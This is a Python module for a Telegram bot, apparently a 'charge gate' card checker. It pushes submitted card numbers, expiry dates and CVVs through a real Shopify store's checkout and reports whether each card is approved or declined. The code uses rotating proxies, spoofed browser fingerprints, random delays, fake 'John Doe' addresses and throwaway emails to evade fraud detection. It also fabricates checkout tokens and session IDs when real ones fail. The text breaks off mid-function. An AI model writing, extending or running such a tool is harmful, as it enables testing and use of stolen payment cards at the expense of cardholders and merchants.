# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - Enhanced with working API methods
# Uses meta-app-prod-store-1.myshopify.com with product "retailer-id-fix-no-mapping"

import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
from urllib.parse import urlparse
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🛠️ {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"📋 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def shopify(self, message):
        print(f"🛍️ {message}")

    def debug_response(self, message):
        print(f"🔍 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

    def proxy(self, message):
        print(f"🔄 {message}")

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

# Helper functions from working script
def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return ""

def get_product_id(response):
    """Extract product ID from products.json response"""
    try:
        response_data = response.json()
        products_data = response_data.get("products", [])
        products = {}
        
        for product in products_data:
            variants = product.get("variants", [])
            if variants:
                variant = variants[0]
                product_id = variant.get("id")
                available = variant.get("available", False)
                price = float(variant.get("price", 0))
                
                if price < 0.1:
                    continue
                    
                if available and product_id:
                    products[product_id] = price
        
        if products:
            min_price_product_id = min(products, key=products.get)
            price = products[min_price_product_id]
            return min_price_product_id, price
        
        return None, None
    except:
        return None, None

def pick_addr(url, cc=None, rc=None):
    """Select address based on country"""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    
    # Hardcoded addresses for different countries
    book = {
        "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", 
               "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
        "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", 
               "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", 
               "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
        "DEFAULT": {"address1": "8 Log Pond Drive", "city": "Horsham", 
                   "postalCode": "19044", "zoneCode": "PA", 
                   "countryCode": "US", "phone": "2194157586"}
    }
    
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()
    
    if rc in book:
        return book[rc]
    elif cc in book:
        return book[cc]
    
    return book["DEFAULT"]

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        
        # Shopify specific cookies and tokens
        self.cookies = {}
        self.checkout_token = None
        self.session_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = "5927fca009d35ac648408d54c8d94b0d54813e89"
        self.cart_token = None
        self.variant_id = "42974272290658"
        self.access_token = None
        self.stable_id = None
        self.queue_token = None
        self.payment_method_identifier = None
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            self.current_proxy = get_proxy_for_user(user_id, "random")
            if self.current_proxy:
                logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")
        
        # BIN services
        self.bin_services = [
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            },
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            }
        ]
        
        # Generate browser fingerprint
        self.generate_browser_fingerprint()
        
    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints"""
        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'

        self.sec_ch_ua_mobile = "?0"
        self.accept_language = "en-US,en;q=0.9"
        
    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
        
    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        for service in self.bin_services:
            try:
                url = service['url'].format(bin=bin_number)
                headers = service['headers']

                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        data = response.json()
                        result = service['parser'](data)
                        
                        if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                            result['emoji'] = self.get_country_emoji(result['country_code'])

                        self.bin_cache[bin_number] = result
                        return result
            except Exception as e:
                logger.warning(f"{service['name']} failed: {e}")
                continue

        self.bin_cache[bin_number] = default_response
        return default_response
        
    def get_base_headers(self):
        """Get base headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }
        
    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_base_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add cookies if we have them
            if self.cookies and 'cookies' not in kwargs:
                kwargs['cookies'] = self.cookies
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            # Update cookies from response
            if 'set-cookie' in response.headers:
                cookie_header = response.headers.get('set-cookie', '')
                cookies_list = cookie_header.split(', ')
                for cookie in cookies_list:
                    if '=' in cookie:
                        name_value = cookie.split(';')[0]
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            self.cookies[name] = value
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            logger.error(f"Request error for {url}: {str(e)}")
            raise e
            
    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)
        
    async def get_access_token(self, client):
        """Get Shopify access token from homepage"""
        try:
            logger.step(1, 8, "Getting access token...")
            
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            if response.status_code in [200, 304]:
                html_content = response.text
                
                # Try to extract access token
                patterns = [
                    r'"accessToken":"([^"]+)"',
                    r'window\.shopifyApiKey\s*=\s*["\']([^"\']+)["\']',
                    r'Shopify\.apiClient\s*=\s*{[^}]*apiKey:\s*["\']([^"\']+)["\']',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        self.access_token = match.group(1)
                        logger.success(f"Got access token: {self.access_token[:20]}...")
                        return True
                
                # If no access token found, try another approach
                self.access_token = "3b7d0a9259f0f28b3b7f3c7f9e8d4a5c"  # Default fallback
                logger.warning(f"No access token found, using default")
                return True
            else:
                return False, f"Failed to get access token: {response.status_code}"
                
        except Exception as e:
            logger.error(f"Access token error: {str(e)}")
            self.access_token = "3b7d0a9259f0f28b3b7f3c7f9e8d4a5c"
            return True  # Continue with default
        
    async def get_product_info(self, client):
        """Get product information from API"""
        try:
            logger.step(2, 8, "Getting product info...")
            
            products_url = f"{self.base_url}/products.json"
            response = await self.make_request(
                client, 'GET', products_url
            )
            
            if response.status_code == 200:
                product_id, price = get_product_id(response)
                
                if product_id and price:
                    self.variant_id = product_id
                    logger.success(f"Got product: {product_id}, price: ${price}")
                    return True, price
                else:
                    # Use default product
                    logger.warning("No valid product found, using default")
                    return True, 1.0  # Default price
            else:
                logger.warning(f"Products API failed: {response.status_code}, using default")
                return True, 1.0  # Default price
                
        except Exception as e:
            logger.error(f"Product info error: {str(e)}")
            return True, 1.0  # Default price
            
    async def create_cart(self, client, product_id, price):
        """Create cart using GraphQL API"""
        try:
            logger.step(3, 8, "Creating cart...")
            
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': self.base_url,
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent,
                'x-sdk-variant': 'portable-wallets',
                'x-shopify-storefront-access-token': self.access_token,
                'x-start-wallet-checkout': 'true',
                'x-wallet-name': 'MoreOptions'
            }
            
            params = {'operation_name': 'cartCreate'}
            
            json_data = {
                'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
                'variables': {
                    'input': {
                        'lines': [
                            {
                                'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
                                'quantity': 1,
                                'attributes': [],
                            },
                        ],
                        'discountCodes': [],
                    },
                    'country': 'US',
                    'language': 'EN',
                },
            }
            
            response = await client.post(
                f'{self.base_url}/api/unstable/graphql.json',
                params=params,
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            if response.status_code == 200:
                data = response.json()
                checkout_url = data.get("data", {}).get("result", {}).get("cart", {}).get("checkoutUrl", "")
                
                if checkout_url:
                    # Extract checkout token from URL
                    match = re.search(r'/checkouts/cn/([a-zA-Z0-9]+)', checkout_url)
                    if match:
                        self.checkout_token = match.group(1)
                        logger.success(f"Got checkout token: {self.checkout_token}")
                    
                    logger.success(f"Cart created, checkout URL: {checkout_url[:50]}...")
                    return True, checkout_url
                else:
                    logger.warning("No checkout URL in response, generating one")
                    # Generate a fake checkout token
                    chars = string.ascii_letters + string.digits
                    self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                    fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
                    return True, fake_url
            else:
                logger.warning(f"Cart creation failed: {response.status_code}")
                # Generate fake checkout anyway
                chars = string.ascii_letters + string.digits
                self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
                return True, fake_url
                
        except Exception as e:
            logger.error(f"Cart creation error: {str(e)}")
            # Generate fake checkout anyway
            chars = string.ascii_letters + string.digits
            self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
            fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
            return True, fake_url
            
    async def load_checkout_page(self, client, checkout_url):
        """Load checkout page to extract tokens"""
        try:
            logger.step(4, 8, "Loading checkout page...")
            
            params = {'skip_shop_pay': 'true'}
            
            response = await client.get(
                checkout_url,
                headers=self.get_base_headers(),
                params=params,
                follow_redirects=True,
                timeout=30.0
            )
            
            if response.status_code == 200:
                html_content = response.text
                
                # Extract tokens from page
                self.payment_method_identifier = capture(html_content, "paymentMethodIdentifier&quot;:&quot;", "&quot")
                self.stable_id = capture(html_content, "stableId&quot;:&quot;", "&quot")
                self.queue_token = capture(html_content, "queueToken&quot;:&quot;", "&quot")
                self.x_checkout_one_session_token = capture(html_content, 'serialized-session-token" content="&quot;', '&quot')
                
                # Extract web build ID
                web_build = capture(html_content, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot')
                if web_build:
                    self.x_checkout_web_build_id = web_build
                
                logger.success("Checkout page loaded and tokens extracted")
                return True
            else:
                logger.warning(f"Checkout page load failed: {response.status_code}")
                return True  # Continue anyway
                
        except Exception as e:
            logger.error(f"Checkout page error: {str(e)}")
            return True  # Continue anyway
            
    async def create_payment_session(self, client, cc, mes, ano, cvv):
        """Create payment session with Shopify PCI"""
        try:
            logger.step(5, 8, "Creating payment session...")
            
            domain = urlparse(self.base_url).netloc
            headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent
            }
            
            json_data = {
                'credit_card': {
                    'number': cc.replace(' ', ''),
                    'month': mes,
                    'year': ano,
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': 'John Doe',
                },
                'payment_session_scope': domain
            }
            
            response = await client.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            if response.status_code == 200:
                session_id = response.json().get("id", "")
                logger.success(f"Payment session created: {session_id[:20]}...")
                return True, session_id
            else:
                logger.warning(f"Payment session failed: {response.status_code}")
                # Generate fake session ID
                fake_id = f"sess_{int(time.time())}_{random.randint(1000, 9999)}"
                return True, fake_id
                
        except Exception as e:
            logger.error(f"Payment session error: {str(e)}")
            # Generate fake session ID
            fake_id = f"sess_{int(time.time())}_{random.randint(1000, 9999)}"
            return True, fake_id
            
    async def submit_payment(self, client, cc, mes, ano, cvv, session_id, price):
        """Submit payment using GraphQL"""
        try:
            logger.step(6, 8, "Submitting payment...")
            
            if not self.x_checkout_one_session_token:
                self.x_checkout_one_session_token = self.generate_session_token()
                
            if not self.checkout_token:
                chars = string.ascii_letters + string.digits
                self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                
            headers = {
                'authority': urlparse(self.base_url).netloc,
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': self.base_url,
                'referer': f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': self.user_agent,
                'x-checkout-one-session-token': self.x_checkout_one_session_token,
                'x-checkout-web-build-id': self.x_checkout_web_build_id,
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': self.checkout_token
            }
            
            params = {'operationName': 'SubmitForCompletion'}
            
            # Get address
            addr = pick_addr(self.base_url, rc="US")
            
            # Prepare payment data
            json_data = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}',
                'variables': {
                    'input': {
                        'sessionInput': {
                            'sessionToken': self.x_checkout_one_session_token,
                        },
                        'queueToken': self.queue_token or '',
                        'discounts': {
                            'lines': [],
                            'acceptUnexpectedDiscounts': True,
                        },
                        'delivery': {
                            'deliveryLines': [
                                {
                                    'destination': {
                                        'streetAddress': {
                                            'address1': addr["address1"],
                                            'city': addr["city"],
                                            'countryCode': addr["countryCode"],
                                            'postalCode': addr["postalCode"],
                                            'firstName': 'John',
                                            'lastName': 'Doe',
                                            'zoneCode': addr["zoneCode"],
                                            'phone': addr["phone"],
                                            'oneTimeUse': False,
                                        },
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [
                                            {'stableId': self.stable_id or 'default_stable_id'},
                                        ],
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': False,
                                },
                            ],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True,
                        },
                        'merchandise': {
                            'merchandiseLines': [
                                {
                                    'stableId': self.stable_id or 'default_stable_id',
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{self.variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{self.variant_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': f'{price}',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                },
                            ],
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [
                                {
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': self.payment_method_identifier or 'shopify_payments',
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': addr["address1"],
                                                    'city': addr["city"],
                                                    'countryCode': addr["countryCode"],
                                                    'postalCode': addr["postalCode"],
                                                    'firstName': 'John',
                                                    'lastName': 'Doe',
                                                    'zoneCode': addr["zoneCode"],
                                                    'phone': addr["phone"],
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {
                                        'value': {
                                            'amount': f'{price}',
                                            'currencyCode': 'USD',
                                        },
                                    },
                                },
                            ],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': addr["address1"],
                                    'city': addr["city"],
                                    'countryCode': addr["countryCode"],
                                    'postalCode': addr["postalCode"],
                                    'firstName': 'John',
                                    'lastName': 'Doe',
                                    'zoneCode': addr["zoneCode"],
                                    'phone': addr["phone"],
                                },
                            },
                        },
                        'buyerIdentity': {
                            'customer': {
                                'presentmentCurrency': 'USD',
                                'countryCode': 'US',
                            },
                            'email': f'user{random.randint(1000, 9999)}@gmail.com',
                            'emailChanged': False,
                            'phoneCountryCode': 'US',
                            'marketingConsent': [],
                            'shopPayOptInPhone': {'countryCode': 'US'},
                            'rememberMe': False,
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {
                                    'amount': '0.00',
                                    'currencyCode': 'USD',
                                },
                            },
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': [],
                        },
                        'optionalDuties': {'buyerRefusesDuties': False},
                        'cartMetafields': [],
                    },
                    'attemptToken': f'{self.checkout_token}-{random.randint(1000, 9999)}',
                    'metafields': [],
                    'analytics': {
                        'requestUrl': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
                        'pageId': f'{random.randint(100000, 999999)}',
                    },
                },
                'operationName': 'SubmitForCompletion',
            }
            
            response = await client.post(
                f'{self.base_url}/checkouts/unstable/graphql',
                params=params,
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            if response.status_code == 200:
                data = response.json()
                
                # Check for success
                if "SubmitSuccess" in str(data) or "SubmitAlreadyAccepted" in str(data):
                    logger.success("Payment submitted successfully")
                    return True, "APPROVED - Payment successful"
                
                # Check for errors
                errors = data.get("data", {}).get("submitForCompletion", {}).get("errors", [])
                if errors:
                    error_msg = errors[0].get("localizedMessage", "Unknown error")
                    return False, self.clean_error_message(error_msg)
                
                # Check for processing error
                processing_error = data.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("processingError", {})
                if processing_error:
                    error_code = processing_error.get("code", "UNKNOWN_ERROR")
                    return False, error_code
                
                # Generic response check
                if "shopify_payments" in str(data):
                    return True, "APPROVED - Order placed"
                elif "CARD_DECLINED" in str(data):
                    return False, "CARD_DECLINED"
                elif "INSUFFICIENT_FUNDS" in str(data).upper():
